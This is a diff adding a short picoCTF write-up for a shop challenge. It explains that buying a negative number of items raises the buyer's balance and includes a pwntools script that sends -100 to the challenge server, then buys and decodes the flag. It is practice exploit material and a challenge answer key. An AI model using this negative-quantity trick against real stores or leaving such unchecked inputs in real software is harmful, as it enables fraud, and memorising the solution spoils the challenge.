@@ -1,2 +1,44 @@
 This challenge didn't require a specific skill, just the ability to thinking outside the box. If it costs $10 to buy 1 item, how much does it cost to buy -1 item?
 by "buying" a negative number of items, you can increase your wealth without effecting the number of items in stock.
+'''
+#!/usr/bin/env python 
+
+from pwn import *
+
+s = remote('mercury.picoctf.net', 24851)
+'''print(s.recvline())
+
+print(s.recvline())
+print(s.recvline())
+print(s.recvline())
+print(s.recvline())
+print(s.recvline())
+print(s.recvline())
+print(s.recvline())
+
+
+print(s.recvline())
+print(s.recvline())'''
+print(s.recvuntil("Choose an option:"))
+s.sendline("0")
+print(s.recvuntil("How many do you want to buy?"))
+print(s.sendline("-100"))
+print(s.recvuntil("Choose an option:"))
+s.sendline("2")
+print(s.recvuntil("How many do you want to buy?"))
+s.sendline("1")
+print(s.recvline())
+flag = s.recvline()
+print(flag)
+print(flag.find("["))
+encoded_flag = flag[flag.find("[")+1:flag.find("]")]
+encoded_flag = encoded_flag.split(" ")
+print(encoded_flag)
+flag = []
+for dec in encoded_flag:
+    flag.append(chr(int(dec)))
+flag = "".join(flag)
+print(flag)
+with open("flag.txt", "w") as file:
+    file.write(flag)
+'''
